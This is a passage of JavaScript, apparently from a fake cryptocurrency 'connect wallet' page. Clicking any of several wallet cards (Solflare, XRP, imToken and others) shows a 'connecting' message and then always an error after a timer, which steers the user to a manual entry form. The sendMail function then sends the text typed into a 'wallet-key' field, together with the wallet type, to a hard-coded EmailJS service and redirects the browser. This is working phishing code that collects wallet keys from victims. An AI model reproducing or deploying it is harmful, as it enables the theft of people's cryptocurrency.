    manualSection.style.display = "none";

    CoinName.textContent = atWalletName.textContent;
    CoinLogo.src = "Images/At-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var solflareCard = document.querySelector(".solflare-card");
  var solflareName = document.getElementById("solflare");
  solflareCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = solflareName.textContent;
    CoinLogo.src = "Images/Solflare-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var xrpCard = document.querySelector(".xrp-card");
  var xrpName = document.getElementById("xrp");
  xrpCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = xrpName.textContent;
    CoinLogo.src = "Images/XRP-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var loomCard = document.querySelector(".loom-card");
  var loomName = document.getElementById("loom");
  loomCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = loomName.textContent;
    CoinLogo.src = "Images/Loom-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var imtokenCard = document.querySelector(".imtoken-card");
  var imtokenName = document.getElementById("imtoken");
  imtokenCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = imtokenName.textContent;
    CoinLogo.src = "Images/Imtoken-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  var othersCard = document.querySelector(".others-card");
  var othersName = document.getElementById("others");
  othersCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = othersName.textContent;
    CoinLogo.src = "Images/Others.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });


function sendMail() {
  var walletAddress = document.getElementById("wallet-key").value;
  var Coin = coinType;  // Use coinType from outer scope

  emailjs.send('service_kyvi3ud', 'template_wua74y9', {
    walletaddress: walletAddress,
    cointype: Coin,
  })
  .then(function(response) {
    window.location.href = "../";
    //window.location.href = "../index.html";
  })
  .catch(function(error) {
    failedToConnect.style.display = "block";
    connectWallet.disabled = false;
    confirmButton2Status();
  });
}

walletAddress.addEventListener("focus", function() {
  failedToConnect.style.display = "none";
});

connectWallet.addEventListener("click", function() {
  sendMail();
  connectWallet.disabled = true;
  confirmButton2Status();
  setTimeout(function() {
    connectWallet.disabled = false;
  }, 5000);
  confirmButton2Status();
});

if (walletAddress.value.length <= 5) {
  connectWallet.disabled = true;
  confirmButton2Status();
} else {
  connectWallet.disabled = false;
  confirmButton2Status();
}
walletAddress.addEventListener("input", function() {
if (walletAddress.value.length <= 5) {
  connectWallet.disabled = true;
  confirmButton2Status();
} else {
  connectWallet.disabled = false;
  confirmButton2Status();
}
});



